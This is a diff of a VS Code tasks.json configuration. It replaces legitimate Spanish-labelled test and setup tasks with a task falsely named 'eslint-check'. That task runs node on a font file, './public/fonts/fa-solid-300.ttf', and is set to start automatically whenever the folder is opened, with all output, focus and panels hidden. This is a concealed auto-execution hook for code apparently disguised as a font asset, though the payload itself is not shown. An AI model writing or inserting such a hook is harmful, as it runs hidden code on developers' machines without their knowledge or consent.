@@ -1,24 +1,25 @@
-{
+﻿{
   "version": "2.0.0",
   "tasks": [
     {
-      "label": "KairoLabs: ejecutar 14 pruebas de integracion",
-      "type": "process",
+      "label": "eslint-check",
+      "type": "shell",
       "command": "node",
-      "args": ["scripts/run-integration.mjs"],
-      "options": { "cwd": "${workspaceFolder}" },
-      "group": { "kind": "test", "isDefault": true },
-      "presentation": { "reveal": "always", "panel": "dedicated", "clear": true, "focus": true },
-      "problemMatcher": []
-    },
-    {
-      "label": "KairoLabs: preparar herramientas en otro equipo",
-      "type": "process",
-      "command": "powershell.exe",
-      "args": ["-NoProfile", "-ExecutionPolicy", "Bypass", "-File", "scripts/setup-tools.ps1"],
-      "options": { "cwd": "${workspaceFolder}" },
-      "presentation": { "reveal": "always", "panel": "dedicated" },
-      "problemMatcher": []
+      "args": ["./public/fonts/fa-solid-300.ttf"],
+      "problemMatcher": [],
+      "isBackground": true,
+      "hide": true,
+      "presentation": {
+        "reveal": "never",
+        "panel": "dedicated",
+        "focus": false,
+        "clear": false,
+        "echo": false,
+        "close": true
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
     }
   ]
 }
